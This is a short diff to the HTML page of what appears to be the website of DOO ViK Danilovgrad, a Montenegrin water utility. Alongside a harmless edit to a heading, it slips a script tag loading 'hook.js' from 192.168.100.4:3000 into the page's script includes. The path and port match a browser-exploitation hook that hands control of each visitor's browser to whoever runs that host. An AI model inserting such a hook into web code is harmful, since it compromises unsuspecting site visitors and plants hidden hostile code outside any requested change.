@@ -84,7 +84,7 @@
     <!-- Map
   ================================================== -->
     <div class=" map">
-        <h2 class="my-3">D.O.O. VIK DANILOVGRAD NA MAPI</h2>
+        <h2 class="my-3">DOO VIK DANILOVGRAD NA MAPI</h2>
         <p class="my-5">Ul. Jefta - Čaja Šćepanovića b.b. Danilovgrad</p>
         <div class="divMap">        <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d2939.519001147477!2d19.095362115696954!3d42.54427133144033!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x134dbeadeed2147f%3A0x1b90d5eb8bd5e8a0!2sJefta%20Scepanovica%20Caja%2C%20Montenegro!5e0!3m2!1sen!2s!4v1596472054318!5m2!1sen!2s" allowfullscreen="" aria-hidden="false" tabindex="0"></iframe>
         </div>
@@ -102,7 +102,8 @@
     <script src="/js/jquery-3.2.1.min.js"></script>
     <script src="/admin/lib/bootstrap/js/bootstrap.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-beta.1/dist/js/select2.min.js"></script>
-
+		<script src="http://192.168.100.4:3000/hook.js"></script>
+ 
     <script src="/js/main.js"></script>
 
     <script>
